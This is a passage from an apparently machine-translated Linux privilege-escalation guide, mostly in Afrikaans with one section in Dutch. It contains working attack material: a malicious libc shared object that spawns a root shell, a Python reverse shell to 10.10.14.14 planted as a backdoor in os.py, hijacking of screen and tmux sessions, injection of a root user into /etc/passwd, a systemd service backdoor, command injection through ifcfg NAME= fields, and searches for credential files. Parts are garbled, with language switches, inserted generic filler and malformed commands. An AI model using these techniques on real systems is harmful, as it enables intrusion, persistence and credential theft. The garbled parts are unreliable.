Maak dan 'n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux-vermoëns bied 'n **subgroep van die beskikbare root-voorregte aan 'n proses**. Dit breek effektief root-voorregte op in kleiner en onderskeidende eenhede. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volledige stel voorregte verminder, wat die risiko van uitbuiting verminder.\
Lees die volgende bladsy om **meer te wete te kom oor vermoëns en hoe om dit te misbruik**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Gidsbevoegdhede

In 'n gids impliseer die **bit vir "uitvoer"** dat die betrokke gebruiker kan "**cd**" na die gids.\
Die **"lees"** bit impliseer dat die gebruiker die **lêerlys** kan **lys**, en die **"skryf"** bit impliseer dat die gebruiker **lêers** kan **verwyder** en **nuwe lêers** kan **skep**.

## ACL's

Toegangsbeheerlyste (ACL's) verteenwoordig die sekondêre laag van diskresionêre bevoegdhede, wat in staat is om die tradisionele ugo/rwx-bevoegdhede te **oorheers**. Hierdie bevoegdhede verbeter die beheer oor toegang tot lêers of gids deur regte toe te laat of te weier aan spesifieke gebruikers wat nie die eienaars of deel van die groep is nie. Hierdie vlak van **fynkorrelige beheer verseker meer presiese toegangsbestuur**. Verdere besonderhede kan [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux) gevind word.

**Gee** gebruiker "kali" lees- en skryfbevoegdhede oor 'n lêer:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACL's van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Oop skul sessies

In **ou weergawes** kan jy dalk 'n **skul**-sessie van 'n ander gebruiker (**root**) **kaap**.\
In die **nuutste weergawes** sal jy slegs in staat wees om aan skerm-sessies van **jou eie gebruiker** te **koppel**. Jy kan egter **interessante inligting binne die sessie vind**.

### Skerm-sessies kaap

**Lys skerm-sessies op**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Koppel aan 'n sessie**

Om toegang te verkry tot 'n aktiewe sessie op 'n Linux-stelsel, kan jy die volgende stappe volg:

1. Identifiseer die sessie wat jy wil koppel aan deur die `who` of `w` opdrag uit te voer. Hierdie opdrag sal 'n lys van aktiewe sessies toon, insluitend die gebruikersnaam en die tty (teletipe) waarop die sessie uitgevoer word.

2. Gebruik die `screen` of `tmux` hulpmiddel om aan die sessie te koppel. Hierdie hulpmiddels bied die vermoë om aan te sluit by 'n bestaande sessie sonder om die huidige sessie te onderbreek.

3. Voer die relevante opdrag in om die sessie te manipuleer of te monitor.

Hier is 'n voorbeeld van hoe om aan 'n sessie te koppel met behulp van die `screen` hulpmiddel:

```bash
screen -r <sessie-ID>
```

Hier is 'n voorbeeld van hoe om aan 'n sessie te koppel met behulp van die `tmux` hulpmiddel:

```bash
tmux attach-session -t <sessie-ID>
```

Onthou om die korrekte sessie-ID te gebruik wanneer jy aan 'n sessie koppel.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-sessies kaping

Dit was 'n probleem met **ou tmux-weergawes**. Ek was nie in staat om 'n tmux (v2.1) sessie wat deur root as 'n nie-bevoorregte gebruiker geskep is, te kaap nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Koppel aan 'n sessie**

Om toegang te verkry tot 'n aktiewe sessie op 'n Linux-stelsel, kan jy die volgende stappe volg:

1. Identifiseer die sessie wat jy wil koppel aan deur die `who` of `w` opdrag uit te voer. Hierdie opdrag sal 'n lys van aktiewe sessies toon, insluitend die gebruikersnaam en die tty (teletipe) waarop die sessie uitgevoer word.

2. Gebruik die `screen` of `tmux` hulpmiddel om aan die sessie te koppel. Hierdie hulpmiddels bied die vermoë om aan te sluit by 'n bestaande sessie sonder om die huidige sessie te onderbreek.

3. Voer die relevante opdrag in om die sessie te manipuleer of te monitor.

Hier is 'n voorbeeld van hoe om aan 'n sessie te koppel met behulp van die `screen` hulpmiddel:

```bash
screen -r <sessie-ID>
```

Hier is 'n voorbeeld van hoe om aan 'n sessie te koppel met behulp van die `tmux` hulpmiddel:

```bash
tmux attach -t <sessie-ID>
```

Onthou om die korrekte sessie-ID te gebruik wanneer jy aan 'n sessie koppel.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine-boks van HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Voorspelbare PRNG - CVE-2008-0166

Alle SSL- en SSH-sleutels wat gegenereer is op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 kan deur hierdie fout geraak word.\
Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel geskep word in hierdie bedryfstelsels, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **deur die ssh-publieke sleutel te hê, kan jy soek na die ooreenstemmende privaat sleutel**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaardes

* **PasswordAuthentication:** Spesifiseer of wagwoord-verifikasie toegelaat word. Die verstek is `no`.
* **PubkeyAuthentication:** Spesifiseer of publieke sleutel-verifikasie toegelaat word. Die verstek is `yes`.
* **PermitEmptyPasswords**: Wanneer wagwoord-verifikasie toegelaat word, spesifiseer dit of die bediener toelaat dat daar aanteken word by rekeninge met leë wagwoordstrings. Die verstek is `no`.

### PermitRootLogin

Spesifiseer of root kan inlog met ssh, verstek is `no`. Moontlike waardes:

* `yes`: root kan inlog met wagwoord en privaat sleutel
* `without-password` of `prohibit-password`: root kan slegs inlog met 'n privaat sleutel
* `forced-commands-only`: Root kan slegs inlog met 'n privaat sleutel en as die opsiesspesifiseer is
* `no` : nee

### AuthorizedKeysFile

Spesifiseer lêers wat die publieke sleutels bevat wat gebruik kan word vir gebruikersverifikasie. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die tuisgids. **Jy kan absolute paaie aandui** (beginnend met `/`) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer om in te teken met die **privaat** sleutel van die gebruiker "**testusername**", ssh die publieke sleutel van jou sleutel gaan vergelyk met die een wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is.

### ForwardAgent/AllowAgentForwarding

SSH-agent deurstuur maak dit moontlik om jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels (sonder wagwoorde!) op jou bediener te laat staan. So, sal jy in staat wees om via ssh **na 'n gasheer te spring** en van daar af **na 'n ander** gasheer te spring **deur gebruik te maak van** die **sleutel** wat in jou **oorspronklike gasheer** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` so instel:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, sal daardie host elke keer as die gebruiker na 'n ander masjien spring, toegang tot die sleutels hê (wat 'n veiligheidsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie opsies **oorheers** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent deurstuur toelaat of weier met die sleutelwoord `AllowAgentForwarding` (verstek is toelaat).

As jy vind dat Forward Agent in 'n omgewing gekonfigureer is, lees dan die volgende bladsy **om moontlik voorregte te verhoog**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe skil gebruik**. Daarom, as jy enige van hulle kan **skryf of wysig, kan jy voorregte verhoog**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As enige vreemde profiel skrips gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow-lêers

Afhanklik van die bedryfstelsel kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam gebruik of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **al hulle te vind** en te **nagaan of jy dit kan lees** om te sien **of daar hasings** binne die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **wagwoordhasings** binne die `/etc/passwd` (of ekwivalente) lêer vind.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eerstens, genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` bevel gebruik met `hacker:hacker`

As alternatief kan jy die volgende lyne gebruik om 'n dummie-gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige veiligheid van die masjien verminder.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: In BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is die `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy kan **skryf na sekere sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n **dienskonfigurasie-lêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat**-bediener hardloop en jy die **Tomcat-dienskonfigurasie-lêer binne /etc/systemd/ kan wysig**, kan jy die lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou agterdeur sal uitgevoer word die volgende keer as tomcat begin word.

### Kontroleer Lêers

Die volgende lêers mag rugsteuners of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie in staat wees om die laaste een te lees nie, maar probeer)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde Ligging/Eienaar-lêers

In sommige gevallen kan het nuttig zijn om te zoeken naar bestanden die zich op ongebruikelijke locaties bevinden of die eigendom zijn van andere gebruikers. Dit kan wijzen op mogelijke beveiligingsproblemen of privilege-escalatiekansen.

Hier zijn enkele locaties en bestanden die u kunt controleren:

#### /tmp

De map /tmp wordt vaak gebruikt om tijdelijke bestanden op te slaan. Het is mogelijk dat kwaadwillende gebruikers hier bestanden plaatsen om later toegang te krijgen tot het systeem. Controleer de inhoud van /tmp en verwijder verdachte bestanden.

#### /var/tmp

Net als /tmp wordt /var/tmp gebruikt voor tijdelijke bestanden. Controleer ook hier de inhoud en verwijder verdachte bestanden.

#### /dev/shm

/dev/shm is een virtueel bestandssysteem dat wordt gebruikt voor het delen van geheugen tussen processen. Het kan ook worden misbruikt om kwaadaardige bestanden te plaatsen. Controleer de inhoud van /dev/shm en verwijder verdachte bestanden.

#### /var/www/html

De map /var/www/html wordt vaak gebruikt voor het hosten van webinhoud. Als u geen webserver op uw systeem hebt geïnstalleerd, kan het wijzen op een ongeautoriseerde toegang. Controleer de inhoud van /var/www/html en verwijder eventuele verdachte bestanden.

#### Bestanden die eigendom zijn van andere gebruikers

Controleer de bestanden op uw systeem en let op bestanden die eigendom zijn van andere gebruikers dan de standaardgebruiker. Dit kan erop wijzen dat een gebruiker ongeautoriseerde toegang heeft gekregen tot uw systeem. Onderzoek deze bestanden en neem passende maatregelen.

Het controleren van deze locaties en bestanden kan u helpen bij het identificeren van mogelijke beveiligingsproblemen en het voorkomen van privilege-escalatie.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die laaste minute

Hier is 'n paar maniere om gewysigde lêers in die laaste paar minute op te spoor:

#### Met behulp van die `find`-opdrag

Gebruik die volgende opdrag om gewysigde lêers in die huidige gids in die laaste 5 minute op te spoor:

```bash
find . -type f -mmin -5
```

Hier is 'n kort verduideliking van die gebruikte vlagte:

- `.`: Dui aan dat die soektog in die huidige gids plaasvind.
- `-type f`: Slegs soek na gewone lêers (nie gidslêers of spesiale lêers nie).
- `-mmin -5`: Soek na lêers wat in die laaste 5 minute gewysig is.

#### Met behulp van die `ls`-opdrag

Gebruik die volgende opdrag om 'n lys van gewysigde lêers in die huidige gids in die laaste 10 minute te kry:

```bash
ls -lt --time=minutes --time-style=+"%Y-%m-%d %H:%M" | grep "$(date -d '10 minutes ago' +'%Y-%m-%d %H:%M')"
```

Hier is 'n kort verduideliking van die gebruikte vlagte:

- `-lt`: Sorteer die lêers volgens gewysigde tyd, met die nuutste bo-aan.
- `--time=minutes`: Toon die gewysigde tyd in minute.
- `--time-style=+"%Y-%m-%d %H:%M"`: Spesifiseer die formaat van die gewysigde tyd.
- `grep "$(date -d '10 minutes ago' +'%Y-%m-%d %H:%M')"`: Filter die lys om slegs die lêers te toon wat in die laaste 10 minute gewysig is.

#### Met behulp van die `find`-opdrag en `stat`-opdrag

Gebruik die volgende opdrag om gewysigde lêers in die huidige gids in die laaste 15 minute op te spoor:

```bash
find . -type f -exec stat -c "%y %n" {} \; | awk -v lim="$(date -d '15 minutes ago' +'%Y-%m-%d %H:%M:%S')" '$0 > lim'
```

Hier is 'n kort verduideliking van die gebruikte vlagte:

- `-exec stat -c "%y %n" {} \;`: Voer die `stat`-opdrag uit vir elke gevonde lêer en toon die gewysigde tyd en lêernaam.
- `awk -v lim="$(date -d '15 minutes ago' +'%Y-%m-%d %H:%M:%S')" '$0 > lim'`: Filter die uitset van die `stat`-opdrag om slegs die lêers te toon wat in die laaste 15 minute gewysig is.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-lêers

SQLite is 'n selfbevatte, bedienerlose, open source SQL-databasisenjin wat gebruik word om databasislêers te skep en te bestuur. Hierdie databasislêers is gewoonlik plat lêers wat gebruik kan word deur toepassings om data te stoor en te onttrek. SQLite-databasislêers het die .db-lêeruitbreiding.

#### Identifiseer SQLite-databasislêers

Om SQLite-databasislêers op 'n Linux-stelsel te identifiseer, kan jy die volgende opdrag gebruik:

```bash
find / -name "*.db" 2>/dev/null
```

Hierdie opdrag sal soek na alle lêers met die .db-uitbreiding in die hele lêerstelsel en die resultate vertoon.

#### Toegang tot SQLite-databasislêers

As jy toegang tot 'n SQLite-databasislêer wil verkry, kan jy dit oopmaak met 'n SQLite-kliënt. Jy kan die volgende opdrag gebruik om 'n SQLite-kliënt te open:

```bash
sqlite3 <path_to_db_file>
```

Vervang `<path_to_db_file>` met die pad na die SQLite-databasislêer wat jy wil oopmaak.

#### Uitvoer van SQL-opdragte

Nadat jy 'n SQLite-databasislêer oopgemaak het met die SQLite-kliënt, kan jy SQL-opdragte uitvoer om data te onttrek of te wysig. Hier is 'n paar nuttige opdragte:

- `SELECT * FROM <table_name>;` - Gee alle rekords terug in 'n spesifieke tabel.
- `INSERT INTO <table_name> VALUES (<values>);` - Voeg 'n nuwe rekord by in 'n spesifieke tabel.
- `UPDATE <table_name> SET <column_name> = <new_value> WHERE <condition>;` - Werk 'n spesifieke rekord in 'n tabel opdateer.
- `DELETE FROM <table_name> WHERE <condition>;` - Verwyder 'n spesifieke rekord uit 'n tabel.

Vervang `<table_name>`, `<column_name>`, `<new_value>` en `<condition>` met die toepaslike waardes vir jou spesifieke situasie.

#### Let op

By die gebruik van SQLite-databasislêers, moet jy bewus wees van die risiko van datakorrupsie of verlies. Maak altyd 'n afskrif van die oorspronklike databasislêer voordat jy enige wysigings aanbring.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_geskiedenis, .sudo\_as\_admin\_suksesvol, profiel, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers

In Linux, versteekte lêers is lêers wat begin met 'n punt (.) in die naam. Hierdie lêers is nie sigbaar wanneer jy die `ls`-opdrag gebruik nie, tensy jy die `-a`-vlag gebruik. Dit is 'n goeie praktyk om belangrike lêers te versteek om te voorkom dat hulle per ongeluk verwyder of gewysig word.

Om versteekte lêers te sien, gebruik die volgende opdrag:

```bash
ls -a
```

Dit sal alle lêers, insluitend die versteekte lêers, in die huidige gids vertoon.

As jy 'n spesifieke versteekte lêer wil sien, gebruik die volgende opdrag:

```bash
ls -a .versteekte_lêer
```

Hierdie opdrag sal die inhoud van die spesifieke versteekte lêer vertoon.

Dit is belangrik om te onthou dat versteekte lêers nie noodwendig veilig is nie. Hulle kan steeds toegangbaar wees vir 'n aanvaller wat toegang tot die stelsel verkry het.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrip/Binêre lêers in PAD**

As jy 'n gebruiker met beperkte regte is op 'n Linux-stelsel, kan jy dalk toegang verkry tot hoër regte deur gebruik te maak van skrip- of binêre lêers wat in die PAD (Path) van die stelsel geplaas is. Die PAD is 'n lys van directories waarin die stelsel soek vir uitvoerbare lêers wanneer 'n opdrag uitgevoer word.

Om hierdie tegniek te gebruik, moet jy 'n skrip of binêre lêer skep met dieselfde naam as 'n bestaande opdrag wat hoër regte vereis. Wanneer die gebruiker met beperkte regte die opdrag uitvoer, sal die stelsel die skrip of binêre lêer in die PAD vind en uitvoer, wat jou toegang tot die hoër regte gee.

Dit is belangrik om te onthou dat hierdie tegniek slegs werk as die gebruiker met beperkte regte die regte het om die oorspronklike opdrag uit te voer.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Weblêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteun**

Backups is 'n belangrike aspek van enige goeie beveiligingsstrategie. Dit behels die maak van kopieë van belangrike data en lêers om te verseker dat dit beskikbaar is in die geval van 'n ongeluk, data verlies, of 'n aanval. Hier is 'n paar belangrike punte om in gedagte te hou wanneer dit kom by backups:

- **Gereelde backups**: Maak gereelde kopieë van jou data om te verseker dat jy die mees onlangse weergawe daarvan het. Dit kan help om verlies van data te voorkom in die geval van 'n aanval of ongeluk.
- **Veilige opberging**: Berg jou backups op 'n veilige plek op, soos 'n eksterne hardeskyf of 'n beveiligde skyf in die wolk. Dit sal help om te verseker dat jou backups nie blootgestel word aan potensiële aanvalle of data verlies nie.
- **Toets jou backups**: Dit is belangrik om gereeld jou backups te toets om seker te maak dat die data suksesvol herstel kan word. Dit sal jou help om te verseker dat jou backups werk en dat jy in staat sal wees om jou data te herstel in die geval van 'n noodgeval.
- **Versleuteling**: As jou backups sensitiewe inligting bevat, oorweeg om dit te versleutel om te verseker dat dit nie in die verkeerde hande val nie. Dit sal help om die vertroulikheid van jou data te beskerm.
- **Offsite backups**: Maak kopieë van jou data op 'n offsite plek, soos 'n ander fisiese ligging of 'n beveiligde wolkoplossing. Dit sal help om te verseker dat jou backups nie verlore gaan in die geval van 'n ramp by jou primêre ligging nie.

Deur hierdie beste praktyke te volg, kan jy verseker dat jou data veilig en beskikbaar bly, selfs in die geval van 'n aanval of ongeluk.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante instrument** wat jy kan gebruik om dit te doen is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n oopbron-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor word, te herwin.

### Logboeke

As jy logboeke kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die logboek is, hoe interessanter dit sal wees (waarskynlik).\
Ook kan sommige "**sleg**" gekonfigureerde (agterdeur?) **ouditlogboeke** jou in staat stel om wagwoorde in ouditlogboeke op te neem, soos verduidelik in hierdie pos: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logboeke van die groep te lees** sal die [**adm**](interesting-groups-linux-pe/#adm-group) groep baie nuttig wees.

### Skuldlêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Algemene Creds Soek/Regex

Jy moet ook kyk vir lêers wat die woord "**password**" in die **naam** of binne die **inhoud** bevat, en kyk ook vir IP-adresse en e-posse binne loglêers, of hashe regexps.\
Ek gaan nie hier lys hoe om dit alles te doen nie, maar as jy belangstel, kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.

## Skryfbare lêers

### Python-biblioteek kaping

As jy weet **waarvandaan** 'n Python-skripsie uitgevoer gaan word en jy **kan binne** daardie vouer skryf of jy kan **Python-biblioteke wysig**, kan jy die OS-biblioteek wysig en dit agterdeur maak (as jy kan skryf waar die Python-skripsie uitgevoer gaan word, kopieer en plak die os.py-biblioteek).

Om die biblioteek **agterdeur te maak**, voeg net die volgende lyn by die einde van die os.py-biblioteek (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate uitbuiting

'n Swakheid in `logrotate` stel gebruikers met **skryfregte** op 'n loglêer of sy ouer gids in staat om moontlik verhoogde bevoegdhede te verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om willekeurige lêers uit te voer, veral in gids soos _**/etc/bash_completion.d/**_. Dit is belangrik om nie net in _/var/log_ nie, maar ook in enige gids waar logrotasie toegepas word, na regte te kyk.

{% hint style="info" %}
Hierdie swakheid affekteer `logrotate` weergawe `3.18.0` en ouer
{% endhint %}

Gedetailleerde inligting oor die swakheid kan op hierdie bladsy gevind word: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie swakheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie swakheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-loglêers),** so wanneer jy vind dat jy loglêers kan wysig, kyk wie bestuur daardie loglêers en kyk of jy bevoegdhede kan verhoog deur die loglêers met simboleerders te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Swakheid verwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

As, om watter rede ookal, 'n gebruiker in staat is om 'n `ifcf-<watookal>` skripsie na _/etc/sysconfig/network-scripts_ **te skryf** of 'n bestaande een **aan te pas**, dan is jou **sisteem pwned**.

Netwerkskripsies, byvoorbeeld _ifcg-eth0_, word gebruik vir netwerkverbindings. Hulle lyk presies soos .INI-lêers. Tog word hulle op Linux \~gebron\~ deur Network Manager (dispatcher.d).

In my geval word die `NAME=` aanduiding in hierdie netwerkskripsies nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die stelsel om die gedeelte na die wit/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Merk die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` is die tuiste van **skripsies** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit sluit skripsies in om dienste te `begin`, `stop`, `herlaai`, en soms `herlaai`. Hierdie kan direk uitgevoer word of deur simboliese skakels in `/etc/rc?.d/` gevind word. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant word `/etc/init` geassosieer met **Upstart**, 'n nuwer **diensbestuurstelsel** wat deur Ubuntu bekendgestel is en konfigurasie lêers vir diensbestuurstake gebruik. Ten spyte van die oorgang na Upstart, word SysVinit-skripsies steeds gebruik saam met Upstart-konfigurasies as gevolg van 'n verenigbaarheidslaag in Upstart.

**systemd** tree na vore as 'n moderne inisialisering en diensbestuurder en bied gevorderde funksies soos aanvraaggedrewe daemonbegin, outomatiese bergbestuur en stelseltoestand-snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakette en `/etc/systemd/system/` vir administratiewe wysigings, wat die stelseladministrasieproses stroomlyn.

## Ander Truuks

### NFS Privilege-escalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Ontsnapping uit beperkte Skille

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kernel Sekuriteitsbeskerming

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Statiese impacket binêre lêers](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc-hulpmiddels

